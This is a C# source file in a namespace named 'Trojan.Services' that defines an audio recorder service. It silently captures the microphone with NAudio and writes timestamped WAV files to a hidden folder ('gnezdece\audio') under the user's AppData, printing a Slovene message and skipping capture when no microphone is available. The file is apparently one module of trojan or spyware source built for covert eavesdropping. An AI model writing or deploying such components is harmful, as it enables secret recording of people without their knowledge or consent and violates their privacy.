using Microsoft.VisualBasic;
using NAudio;
using NAudio.Wave;
using System;
using System.IO;

namespace Trojan.Services
{
    public class AudioRecorderService
    {
        private WaveInEvent _waveSource;
        private WaveFileWriter _waveFile;

        public void Start()
        {
            try
            {
                string folder = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                    "gnezdece",
                    "audio"
                );

                if (!Directory.Exists(folder))
                    Directory.CreateDirectory(folder);

                string filePath = Path.Combine(
                    folder,
                    $"audio_{DateTime.Now:yyyyMMdd_HHmmss}.wav"
                );

                _waveSource = new WaveInEvent();
                _waveSource.WaveFormat = new WaveFormat(44100, 1);

                _waveSource.DataAvailable += (s, a) =>
                {
                    _waveFile?.Write(a.Buffer, 0, a.BytesRecorded);
                    _waveFile?.Flush();
                };

                _waveSource.RecordingStopped += (s, a) =>
                {
                    _waveFile?.Dispose();
                    _waveFile = null;

                    _waveSource?.Dispose();
                    _waveSource = null;
                };

                _waveFile = new WaveFileWriter(filePath, _waveSource.WaveFormat);
                _waveSource.StartRecording();
            }
            catch (MmException ex)
            {
                Console.WriteLine($"Mikrofon ni na voljo. Preskakujem snemanje zvoka: {ex.Message}");
                _waveFile?.Dispose();
                _waveFile = null;
                _waveSource?.Dispose();
                _waveSource = null;
            }
        }

        public void Stop()
        {
            _waveSource?.StopRecording();
        }
    }
}